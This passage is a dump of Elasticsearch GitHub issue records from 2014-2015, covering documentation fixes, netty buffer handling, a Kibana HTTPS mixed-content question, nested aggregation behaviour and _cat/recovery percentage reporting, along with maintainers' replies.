should use a scorer that checks for a threshold if we don't use a threshold. I think we should have a wrapping scorer that does this and it should simply wrap the actual scorer we use. This is otherwise significant overhead in such a tide loop
</comment><comment author="brwe" created="2014-10-24T08:34:36Z" id="60359062">@s1monw added a commit, is this what you meant by wrapping the scorer?
</comment><comment author="rjernst" created="2014-10-24T16:08:37Z" id="60409397">I left a few comments.  This looks much cleaner and well contained!
</comment><comment author="brwe" created="2014-11-27T18:53:00Z" id="64821983">thanks again for the review and sorry it took so long. addressed all comments.
</comment><comment author="rjernst" created="2014-11-27T19:08:13Z" id="64822926">LGTM.
</comment><comment author="brwe" created="2014-11-28T11:38:08Z" id="64885137">closed by 59507cf793c17ca2ea99c15230c126b88bebd49e
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Resolves #7812 : adding elasticsearch-dsl to list of python clients</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7813</link><project id="" key="" /><description>adding [elasticsearch-dsl](https://github.com/elasticsearch/elasticsearch-dsl-py) to list of python clients.

This resolve Documentation Issue #7812
</description><key id="43420579">7813</key><summary>Resolves #7812 : adding elasticsearch-dsl to list of python clients</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">brentpayne</reporter><labels><label>docs</label></labels><created>2014-09-22T06:57:57Z</created><updated>2014-10-16T14:49:07Z</updated><resolved>2014-10-14T11:21:12Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-25T17:05:10Z" id="56850328">Hi @brentpayne 

Thanks for the PR. Please could I ask you to sign the CLA so that I can merge your changes in?
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="clintongormley" created="2014-09-29T14:56:07Z" id="57173146">Hi @brentpayne 

Had a chance to sign the CLA yet? http://www.elasticsearch.org/contributor-agreement/

thanks
</comment><comment author="clintongormley" created="2014-10-14T11:19:17Z" id="59027229">CLA not signed. Treating as request.
</comment><comment author="brentpayne" created="2014-10-14T16:29:02Z" id="59074426">sorry these updates were being filtered out of my inbox, signed cla
</comment><comment author="clintongormley" created="2014-10-16T14:49:07Z" id="59373089">thanks @brentpayne 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Documentation Issue: elasticsearch-dsl missing from python clients</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7812</link><project id="" key="" /><description>your own python client for extending elasticsearch-py with chainable query construction is missing from the list of python clients list.
elasticsearch-dsl[https://github.com/elasticsearch/elasticsearch-dsl-py] 
</description><key id="43420406">7812</key><summary>Documentation Issue: elasticsearch-dsl missing from python clients</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">brentpayne</reporter><labels /><created>2014-09-22T06:57:16Z</created><updated>2014-10-14T11:21:12Z</updated><resolved>2014-10-14T11:21:12Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Chunk direct buffer usage by networking layer</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7811</link><project id="" key="" /><description>Today, due to how netty works (both on http layer and transport layer), and even though the buffers sent over to netty are paged (CompositeChannelBuffer), it ends up re-copying the whole buffer into another heap buffer (bad), and then send it over directly to sun.nio which allocates a full thread local direct buffer to send it (which can be repeated if not all message is sent).
  This is problematic for very large messages, aside from the extra heap temporal usage, the large direct buffers will stay around and not released by the JVM.
  This change forces the use of gathering when building a CompositeChannelBuffer, which results in netty using the sun.nio write method that accepts an array of ByteBuffer (so no extra heap copying), and also reduces the amount of direct memory allocated for large messages.
  See the doc on NettyUtils#DEFAULT_GATHERING for more info.
</description><key id="43331615">7811</key><summary>Chunk direct buffer usage by networking layer</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kimchy</reporter><labels><label>:Network</label><label>blocker</label><label>enhancement</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-21T10:11:13Z</created><updated>2015-06-07T16:31:42Z</updated><resolved>2014-09-23T10:16:18Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-22T19:22:07Z" id="56426193">I left some comments but in general LGTM
</comment><comment author="s1monw" created="2014-09-23T10:11:46Z" id="56498858">LGTM - ran tests on java 8 and java 7 +1 to push
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>HTTPS to Kibana, no response from elasticsearch</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7810</link><project id="" key="" /><description>Hi,

I am a newbie but did not find this issue anywhere else (but we all say that).
Setup:
No firewalls (internal LAN)
Kibana 3.1.0
Elasticsearch 1.3.2
Logstash 1.4.2

Logstash receives local syslog events (just an initial test setup).
I can connect to Kibana over both HTTP and HTTPS. I have it behind an apache basic auth to protect it. I can telnet from my workstation to the elasticsearch port.

If I access Kibana over HTTP, it works wonderfully :-) BUT if I switch to HTTPS it fails miserably. The logs from within the JS are not very helpful, so it took a bit of tracking down.

So my problem is that I cannot use HTTPS for Kibana and HTTP for Kibana =&gt; elasticsearch. Is that an intended dependency between them?
</description><key id="43330583">7810</key><summary>HTTPS to Kibana, no response from elasticsearch</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">chainmail</reporter><labels><label>non-issue</label></labels><created>2014-09-21T09:07:47Z</created><updated>2014-09-26T19:00:02Z</updated><resolved>2014-09-26T19:00:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rashidkpc" created="2014-09-26T19:00:02Z" id="57005828">This is due to the browser, very reasonably, refusing to load insecure mixed content. 

When you access Kibana over plain, insecure HTTP, your browser assumes you don't care much about security, thus is more than happy to make the requests to Elasticsearch over HTTP.

When you then try to access Kibana over HTTPS, the browser says, "Hey, this user wants encryption, and identity assurance!". 

If you've then configured Kibana to talk to Elasticsearch over HTTP, the browser says, "Hmm, they said they wanted HTTPS, but the script I loaded over HTTPS wants to load more stuff over insecure(!) HTTP. The user didn't sign up for that action, some script is making that call. DENIED" 

This is all quite reasonable, the only thing you'd be protecting is Kibana's static assets that anyone can freely clone from github. The valuable data would be transmitted insecurely, fortunately the browser has your back on that one.

If you want more information on the how and why, Mozilla has a nice blog post about Firefox's mixed content blocker here: https://blog.mozilla.org/tanvi/2013/04/10/mixed-content-blocking-enabled-in-firefox-23/. All major browsers block mixed content.

You can avoid this by setting up a proxy to securely transport XHR requests from the browser, to your webserver and then transmit them unencrypted to Elasticsearch over your, presumably segmented, private network. See some example in the kibana repo here: https://github.com/elasticsearch/kibana/tree/master/sample
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>1.4</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7809</link><project id="" key="" /><description /><key id="43312637">7809</key><summary>1.4</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">xhwSkhizein</reporter><labels /><created>2014-09-20T15:32:59Z</created><updated>2014-09-21T05:37:27Z</updated><resolved>2014-09-21T05:23:29Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-09-20T15:50:54Z" id="56271621">I guess it's an error, right?
</comment><comment author="xhwSkhizein" created="2014-09-21T05:37:27Z" id="56289866">It's my fault, I am interesting in the project, I want to clone one to my
github home page, I am so sorry for that i didn't figure out how to do it,
and I make this mistake, and waste your time.

Alex
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Correct the order in the url.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7808</link><project id="" key="" /><description /><key id="43310496">7808</key><summary>Correct the order in the url.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">phungleson</reporter><labels /><created>2014-09-20T13:42:02Z</created><updated>2014-10-14T19:59:11Z</updated><resolved>2014-09-25T17:06:18Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-25T17:06:18Z" id="56850493">Hi @phungleson 

Thanks for the PR, but the existing order is actually correct (although the old order is still supported).  We changed it to make the index apis more consistent.

thanks anyway
</comment><comment author="phungleson" created="2014-09-28T02:14:56Z" id="57072317">Thanks @clintongormley 

Okay, the whole page use this syntax `index/type/_mapping`

So maybe we refactor the page to reflect the correct order, which I assume `index/_mapping/type`.

We can leave a note about backward compatibility as well?

Cheers,
</comment><comment author="clintongormley" created="2014-09-30T17:55:35Z" id="57354603">@phungleson i'd be happy to accept a PR updating the whole page :)

I'd rather not mention the bwc note, as the idea is to migrate people to the new APIs.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Docs : Filtering based on exact values not working</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7807</link><project id="" key="" /><description>If I try to do that, as a doc, I have a parsing error.

```
{
   "aggs" : {
       "tags" : {
            "terms" : {
                "field" : "make",
                "exclude" : ["mazda", "honda"]
            }
        }
    }
}
```

Errors exemple : 

```
Parse Failure [Unknown key for a START_ARRAY in [dedup]: [exclude].]];
```

If I want it to work I have to do use a regular expression :

```
{
   "aggs" : {
       "tags" : {
            "terms" : {
                "field" : "tags",
                "exclude" : "mazda|honda"
            }
        }
    }
}
```
</description><key id="43309989">7807</key><summary>Docs : Filtering based on exact values not working</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/markharwood/following{/other_user}', u'events_url': u'https://api.github.com/users/markharwood/events{/privacy}', u'organizations_url': u'https://api.github.com/users/markharwood/orgs', u'url': u'https://api.github.com/users/markharwood', u'gists_url': u'https://api.github.com/users/markharwood/gists{/gist_id}', u'html_url': u'https://github.com/markharwood', u'subscriptions_url': u'https://api.github.com/users/markharwood/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/170925?v=4', u'repos_url': u'https://api.github.com/users/markharwood/repos', u'received_events_url': u'https://api.github.com/users/markharwood/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/markharwood/starred{/owner}{/repo}', u'site_admin': False, u'login': u'markharwood', u'type': u'User', u'id': 170925, u'followers_url': u'https://api.github.com/users/markharwood/followers'}</assignee><reporter username="">bastiendonjon</reporter><labels><label>docs</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-20T13:10:51Z</created><updated>2014-10-01T12:56:26Z</updated><resolved>2014-09-22T12:41:39Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-09-22T09:36:37Z" id="56349922">@bastiendonjon thanks for raising the bug.  This is actually a documentation issue, as this feature is available in an upcoming release and should have a note in the documentation stating the version it will become available in.  Sorry for any confusion caused, we will get the documentation updated
</comment><comment author="bastiendonjon" created="2014-09-22T09:41:46Z" id="56350409">Ok :-)
</comment><comment author="markharwood" created="2014-09-22T12:41:39Z" id="56366797">Added note to documentation that this is a forthcoming feature
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Feature idea: moving windows for aggregation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7806</link><project id="" key="" /><description>Hi everyone,

This issue is a follow-up from this thread (https://groups.google.com/forum/#!msg/elasticsearch/BSWVafBefp8/tiBEomy7OAgJ).

Moving window is a very handy analytics feature that can be found in Oracle and PostgreSQL, and it would be awesome to have something similar in Elasticsearch. The idea is to define a "window" that is moving (typically inside a specified time range) to perform various analytics operations. The implementation in Oracle is a bit complex and cover more uses that what I need, so I'd suggest you have a look at how it works there too :).

Moving windows allow to answer that kind of questions: for each day inside a timeframe, give me the sum amount for the last 30 days, starting from the given day. For instance, with following data:

``` json
[
    {
        "date": "2014-01-01",
        "amount": 10
    },
    {
        "date": "2014-01-01",
        "amount": 15
    },
    {
        "date": "2014-01-02",
        "amount": 5
    },  
    {
        "date": "2014-01-03",
        "amount": 25
    },
    {
        "date": "2014-01-05",
        "amount": 8
    }
] 
```

If we want the sum for the last 3 days at each point, the result would be:

2014-01-01: 10+15 = 25
2014-01-02: 10+15+5 = 30
2014-01-03: 10+15+5+25 = 55
2014-01-04: 5+25+0 = 30
2014-01-05: 5+25+0+8 = 38

As you can see, some interesting optimizations could be done, so that Elasticsearch does not need to recompute the sum at each window, but rather reuse the result of the previous window.

Currently, the only way to do that in Elasticsearch is either to define one bucket for each couple (so "now-60d" to "now-30d", "now-59d" to "now-29"... and so on), but this is very inefficient. Or asking for more data and manually create the rolling sum/avg/... in client side.

I don't have any idea about what the syntax could be:

``` json
{
    "query": {
        "filtered": {
            "filter": {
                "range": {
                    "my_date": {
                        "from": "now-60d",
                        "to": "now"
                    }
                }
            }
        }
    },

    "aggs": {
        "by_date": {
            "date_histogram": {
                "field": "my_date",
                "interval": "day"
            },

            "window": {
                "period": "-30d",
                "min": "now-30d",

                "aggs": {
                    "my_sum": {
                        "sum": "amount"
                    }
                }
            }
        }
    }
}
```

The idea would be to first filter data so that we have enough data to cover the "-30d" in the window. The window would then define a period (if positive, it would be "all the records after", or if negative "all the records before"). The "min" would allow to limit results (because we want 30 data points with each sum being the result of last 30 days BEFORE the given day, that's why we need to filter "now-60d" but we only want for the last 30 days).

The syntax here only cover date, while Oracle/PostgreSQL window functions can only be used for operations like "return sum of last 30 records".

Let me know if you need any more details about the use case :).

Thanks!
</description><key id="43309924">7806</key><summary>Feature idea: moving windows for aggregation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bakura10</reporter><labels /><created>2014-09-20T13:08:19Z</created><updated>2014-09-25T20:38:25Z</updated><resolved>2014-09-25T20:38:25Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-25T20:38:25Z" id="56880199">Hi @bakura10 

While this is not exactly the same as #4404, it is related.  There are plans afoot for such a feature, and I'm using #4404 as the "main" issue here. 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Issue when applying nested aggregation and nested filter</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7805</link><project id="" key="" /><description>Consider a scenario.
I've a mapping like this, 

```
PUT /x1/x4/_mapping
{
  "x4": {
    "properties": {
      "playerYears": {
        "type": "nested",
        "properties": {
          "schoolsOfInterest": {
            "type": "nested",
            "properties": {
              "name": {
                "type": "string",
                "index": "not_analyzed"
              }
            }
          },
          "rating": {
            "type": "float"
          }
        }
      }
    }
  }
}
```

Consider simple data, 

```
POST /x1/x4/1
{
  "playerYears": {
    "rating": 10,
    "schoolsOfInterest": {
      "name": "x"
    }
  }
}
```

And, When I apply filter like below,

```
POST /x1/x4/_search
{
  "size": 0,
  "aggs": {
    "rating": {
      "nested": {
        "path": "playerYears"
      },
      "aggs": {
        "rating-filtered": {
          "filter": {
            "nested": {
              "path": "playerYears.schoolsOfInterest",
              "query": {
                "match_all": {}
              }
            }
          }
        }
      }
    }
  },
  "query": {
    "match_all": {}
  }
}
```

Then result is zero for `rating-filtered` aggregation. 

I am not able to figure it out why, can anyone help ? 
</description><key id="43299423">7805</key><summary>Issue when applying nested aggregation and nested filter</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/martijnvg/following{/other_user}', u'events_url': u'https://api.github.com/users/martijnvg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/martijnvg/orgs', u'url': u'https://api.github.com/users/martijnvg', u'gists_url': u'https://api.github.com/users/martijnvg/gists{/gist_id}', u'html_url': u'https://github.com/martijnvg', u'subscriptions_url': u'https://api.github.com/users/martijnvg/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/580421?v=4', u'repos_url': u'https://api.github.com/users/martijnvg/repos', u'received_events_url': u'https://api.github.com/users/martijnvg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/martijnvg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'martijnvg', u'type': u'User', u'id': 580421, u'followers_url': u'https://api.github.com/users/martijnvg/followers'}</assignee><reporter username="">rbnacharya</reporter><labels /><created>2014-09-20T03:14:33Z</created><updated>2015-01-12T13:34:05Z</updated><resolved>2015-01-12T13:34:05Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-25T20:07:32Z" id="56875834">Hi @rbnacharya 

Your agg should use another `nested` agg to step down into the grandchild, eg:

```
POST /x1/x4/_search
{
  "size": 0,
  "aggs": {
    "rating": {
      "nested": {
        "path": "playerYears"
      },
      "aggs": {
        "rating-filtered": {
          "nested": {
            "path": "playerYears.schoolsOfInterest"
          }
        }
      }
    }
  },
  "query": {
    "match_all": {}
  }
}
```

That said, I can see why you would think that your example should work. 

@martijnvg any thoughts about this?
</comment><comment author="martijnvg" created="2015-01-12T13:34:05Z" id="69569924">I would expect that @rbnacharya example to work too, but the issue is that the `nested` filter is unaware of the fact it is wrapped in a `nested` aggregator and therefor assumes it needs to translate the nested hits to root (non nested) hits. The nested query simply doesn't get the context it is in from the `nested` aggregator. This is different then when a `nested` query/filter is wrapped in another `nested` query/filter, in that case the wrapped `nested` query is aware of the fact it is wrapped by a parent `nested` query/filter.

Due to the structure of the `nested` aggregator and the streaming parsing fixing this issue is tricky. One can define the request so that the child agg appears first:

```
{
  "aggs": {
    "rating": {
      "aggs": {
        "rating-filtered": {
          "filter": {
            "nested": {
              "path": "playerYears.schoolsOfInterest",
              "query": {
                "match_all": {}
              }
            }
          }
        },
        "nested": {
           "path": "playerYears"
        }
      }
    }
  },
}
```

So event if we did pass the nested context to the nested filter in the above case nothing would be passed, because the nested options have not been parsed yet.

I think the example that @clintongormley shared is a clearer way to define what @rbnacharya is after, because that example only makes used of `nested` aggregator and doesn't mix it with `nested` filter. One can still wrap the filter in the `rating-filtered` agg, that uses a term or range filter.

That said I think the best way to improve here is to add more validation. In this case the nested agg was expecting docs on the `playerYears` level while the nested filter was production root (non nested) documents as hits. ES should fail here, so that it is clear that the query defined is producing incorrect results (instead of returning 0 count as result).

I think this validation should not just be for the nested query/filter, but also for the nested aggregation and nested inner hits. Lets say one wraps two `nested` inner aggregations, but the `path` of the second `nested` aggregator is invalid, because it doesn't fall under the `path` of the first `nested` aggregator, it would good to fail. I'll open an issue for that.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Remove unused ForceSyncDirectory</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7804</link><project id="" key="" /><description>Looks like this is historical, now unused code ...
</description><key id="43265083">7804</key><summary>Remove unused ForceSyncDirectory</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">mikemccand</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-19T17:57:05Z</created><updated>2015-06-07T10:32:53Z</updated><resolved>2014-09-19T18:13:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-09-19T18:01:02Z" id="56212337">LGTM, I suggest though not removing the `toString` impl, its cleaner instead of the simple class name (which is long and not nice for internal classes).
</comment><comment author="kimchy" created="2014-09-19T18:01:16Z" id="56212362">btw, I think this can also go to 1.4
</comment><comment author="mikemccand" created="2014-09-19T18:01:46Z" id="56212429">OK I'll keep the toString, and put in 1.4 as well.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>_cat/recovery stage done but not 100%</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7803</link><project id="" key="" /><description>I have two clusters each three nodes running elasticsearch version: 1.3.2, build: dee175d.

Network issues disconnected one node each cluster - they periodically rejoined and disconnected before completing shard recovery - finally they rejoined again and completed recovery successfully.

cluster state is green and all shards are in state started on both clusters.

But if I call _cat/recovery api I get a lot of shard-entries with **stage done** but **below 100 percent**.

Maybe there is a small bug in the file_percent and bytes_percent calculation?

Example of one index - in about 70% of the entries files_percent and bytes_percent are below 100%

```
index             shard time   type       stage source_host          target_host          repository snapshot files files_percent bytes      bytes_percent
myindex.1       0     341    replica    done  esnode2 esnode1 n/a        n/a      13    38.5%         3366643    0.0%          
myindex.1       0     573    replica    done  esnode1 esnode2 n/a        n/a      13    7.7%          3366643    0.0%          
myindex.1       0     4992   replica    done  esnode1 esnode3 n/a        n/a      13    7.7%          3366643    0.0%          
myindex.1       1     433    replica    done  esnode2 esnode1 n/a        n/a      16    56.3%         626683     13.3%         
myindex.1       1     641    replica    done  esnode1 esnode2 n/a        n/a      16    6.3%          628222     0.1%          
myindex.1       1     2332   replica    done  esnode1 esnode3 n/a        n/a      16    12.5%         628222     0.1%          
myindex.1       2     736    replica    done  esnode2 esnode1 n/a        n/a      38    68.4%         3119317    50.4%         
myindex.1       2     666    replica    done  esnode1 esnode2 n/a        n/a      41    12.2%         3131721    0.1%          
myindex.1       2     1498   replica    done  esnode1 esnode3 n/a        n/a      41    12.2%         3131721    0.1%          
myindex.1       3     4611   replica    done  esnode2 esnode1 n/a        n/a      23    91.3%         9763636    99.7%         
myindex.1       3     724    replica    done  esnode1 esnode2 n/a        n/a      23    4.3%          9763636    0.0%          
myindex.1       3     30222  replica    done  esnode1 esnode3 n/a        n/a      23    4.3%          9763636    0.0%          
```
</description><key id="43247060">7803</key><summary>_cat/recovery stage done but not 100%</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/bleskes/following{/other_user}', u'events_url': u'https://api.github.com/users/bleskes/events{/privacy}', u'organizations_url': u'https://api.github.com/users/bleskes/orgs', u'url': u'https://api.github.com/users/bleskes', u'gists_url': u'https://api.github.com/users/bleskes/gists{/gist_id}', u'html_url': u'https://github.com/bleskes', u'subscriptions_url': u'https://api.github.com/users/bleskes/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/1006375?v=4', u'repos_url': u'https://api.github.com/users/bleskes/repos', u'received_events_url': u'https://api.github.com/users/bleskes/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/bleskes/starred{/owner}{/repo}', u'site_admin': False, u'login': u'bleskes', u'type': u'User', u'id': 1006375, u'followers_url': u'https://api.github.com/users/bleskes/followers'}</assignee><reporter username="">lefce</reporter><labels><label>adoptme</label><label>bug</label></labels><created>2014-09-19T14:54:49Z</created><updated>2015-04-07T15:17:50Z</updated><resolved>2015-04-07T15:17:50Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="wkoot" created="2015-04-02T14:35:35Z" id="88930668">Experiencing a similar mismatch in v1.4.5, it seems like the _cat/recovery is displaying old info instead of latest:

```
[root@server6 es_backup]# curl localhost:9200/_cat/recovery?v
index               shard time    type    stage source_host             target_host             repository snapshot files files_percent bytes       bytes_percent
logstash-2015.04.02 0     483354  replica done  server9 server8 n/a        n/a      264   100.0%        12464831362 100.0%
logstash-2015.04.02 0     234888  replica done  server6 server9 n/a        n/a      344   96.2%         12132788120 56.1%
logstash-2015.03.30 0     11508   replica done  server7 server9 n/a        n/a      297   0.0%          25026154544 0.0%
logstash-2015.03.30 0     1899    replica done  server9 server7 n/a        n/a      297   0.3%          25026154544 0.0%
logstash-2015.03.31 0     2536    replica done  server6 server8 n/a        n/a      261   0.0%          24031903745 0.0%
logstash-2015.03.31 0     1065129 replica done  server8 server6 n/a        n/a      261   100.0%        24031903745 100.0%
logstash-2015.04.01 0     757     replica done  server6 server8 n/a        n/a      357   0.0%          24812247622 0.0%
logstash-2015.04.01 0     1461104 replica done  server8 server6 n/a        n/a      357   100.0%        24812247622 100.0%
kibana-int          0     249     replica done  server7 server9 n/a        n/a      10    10.0%         24745       0.9%
kibana-int          0     558     replica done  server9 server7 n/a        n/a      10    0.0%          24745       0.0%
logstash-2015.03.28 0     2247    gateway done  server6 server6 n/a        n/a      390   100.0%        24113948752 100.0%
logstash-2015.03.28 0     767     replica done  server6 server7 n/a        n/a      389   0.3%          24113948752 0.0%
logstash-2015.03.27 0     12602   replica done  server7 server9 n/a        n/a      320   0.0%          23894985390 0.0%
logstash-2015.03.27 0     3307    replica done  server9 server7 n/a        n/a      320   0.0%          23894985390 0.0%
logstash-2015.03.29 0     2839    replica done  server9 server8 n/a        n/a      377   0.0%          22019045112 0.0%
logstash-2015.03.29 0     8148    replica done  server8 server9 n/a        n/a      377   0.0%          22019045112 0.0%
```

Even though all primary and replica shards are started ok:

```
[root@server6 es_backup]# curl localhost:9200/_cat/shards?v
index               shard prirep state       docs  store host    node
logstash-2015.04.02 0     r      STARTED 44426778 13.2gb server8 Eric Williams
logstash-2015.04.02 0     p      STARTED 44424546 13.5gb server9 Kingo Sunen
logstash-2015.03.30 0     r      STARTED 76295131 23.3gb server9 Kingo Sunen
logstash-2015.03.30 0     p      STARTED 76295131 23.3gb server7 Black Panther
logstash-2015.03.31 0     p      STARTED 75755714 22.3gb server8 Eric Williams
logstash-2015.03.31 0     r      STARTED 75755714 22.3gb server6 Kehl of Tauran
logstash-2015.04.01 0     p      STARTED 77378857 23.1gb server8 Eric Williams
logstash-2015.04.01 0     r      STARTED 77378857 23.1gb server6 Kehl of Tauran
kibana-int          0     r      STARTED        3 24.2kb server9 Kingo Sunen
kibana-int          0     p      STARTED        3 24.2kb server7 Black Panther
logstash-2015.03.28 0     p      STARTED 74580676 22.4gb server6 Kehl of Tauran
logstash-2015.03.28 0     r      STARTED 74580676 22.4gb server7 Black Panther
logstash-2015.03.27 0     r      STARTED 74898627 22.2gb server9 Kingo Sunen
logstash-2015.03.27 0     p      STARTED 74898627 22.2gb server7 Black Panther
logstash-2015.03.29 0     p      STARTED 68759201 20.5gb server8 Eric Williams
logstash-2015.03.29 0     r      STARTED 68759201 20.5gb server9 Kingo Sunen
```
</comment><comment author="clintongormley" created="2015-04-05T17:26:21Z" id="89814947">@bleskes any ideas about this?
</comment><comment author="bleskes" created="2015-04-07T15:17:50Z" id="90606211">with 1.3.2 the file % shows of recovered bytes of the total shard size. That means it will bellow 100% if files are re-used. It's confusing and we changed in #9811 to make 100% to mean all bytes that needs to be recovered (instead of total bytes).

I think we can close this, as the class is now refactored and cleaned up.  If you still feel there are issues with it (or I missed something), please feel free to reopen.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix Idaho spelling</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7802</link><project id="" key="" /><description>Doesn't have two `d`s.
</description><key id="43241287">7802</key><summary>Fix Idaho spelling</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">buob</reporter><labels><label>docs</label></labels><created>2014-09-19T14:00:53Z</created><updated>2014-09-28T09:10:18Z</updated><resolved>2014-09-28T09:10:18Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-25T17:06:34Z" id="56850524">Hi @buob 

Good catch. Please could I ask you to sign the CLA so that I can merge your changes in?
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="buob" created="2014-09-25T17:17:08Z" id="56852057">Signed
